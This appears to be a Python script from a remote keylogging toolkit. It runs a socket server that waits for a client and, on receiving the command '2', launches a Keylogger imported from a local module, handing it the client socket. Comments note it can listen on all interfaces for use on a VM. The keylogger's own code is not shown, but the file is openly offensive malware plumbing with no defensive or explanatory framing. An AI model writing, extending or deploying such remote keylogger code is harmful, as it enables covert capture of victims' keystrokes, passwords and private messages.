import socket
from pynput import keyboard
from keylogger import Keylogger

# # Server configuration VM
# HOST = '0.0.0.0'  # Change to the desired IP address or '0.0.0.0' to listen on all available network interfaces
# PORT = 12345

# Server configuration local
HOST = 'localhost'  # Change to the desired IP address or '0.0.0.0' to listen on all available network interfaces
PORT = 12346

# Create a socket server
server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)  # Allow address reuse
server_socket.bind((HOST, PORT))
server_socket.listen(1)
print(f"Server is listening on {HOST}:{PORT}")

# Accept a client connection
client_socket, client_address = server_socket.accept()
print(f"Accepted connection from {client_address}")

while True:
    # Perform communication with the client
    data = client_socket.recv(1024)
    if not data:
        break  # Exit the loop when the client disconnects

    data = data.decode()
    print(f"Received: {data}")

    if data == '2':
        print("Launch keylogger")
        Keylogger = Keylogger(client_socket)
        Keylogger.start()

# Close the client socket
client_socket.close()
print(f"Client disconnected from {client_address}")

# Close the server socket (optional)
server_socket.close()